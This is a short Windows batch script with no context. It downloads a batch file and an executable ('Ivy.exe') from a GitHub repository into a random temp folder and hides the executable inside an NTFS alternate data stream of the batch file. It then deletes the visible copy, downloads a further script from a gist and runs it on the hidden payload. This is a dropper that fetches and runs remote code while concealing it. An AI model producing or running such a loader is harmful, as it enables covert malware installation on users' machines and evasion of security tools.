@echo off
cd %temp%
set /a num=%random%
mkdir %num% && cd %num%
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/test.bat' -OutFile 'test.bat'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/Ivy.exe' -OutFile 'Ivy.exe'"
powershell -command " & {(Get-Content %CD%\Ivy.exe -Raw | Set-Content %CD%\test.bat -Stream file.exe)}"
del %CD%\Ivy.exe
powershell -Command "Invoke-WebRequest -Uri 'https://gist.github.com/roboisaac11/f54f8b182f3fbc2a3a0426e4197d07e5/raw/ff290eb3c98c5a9d1991334da8fd5a4019ea6bc9/file.bat' -OutFile 'file.bat'"
%CD%\file.bat %CD%\test.bat
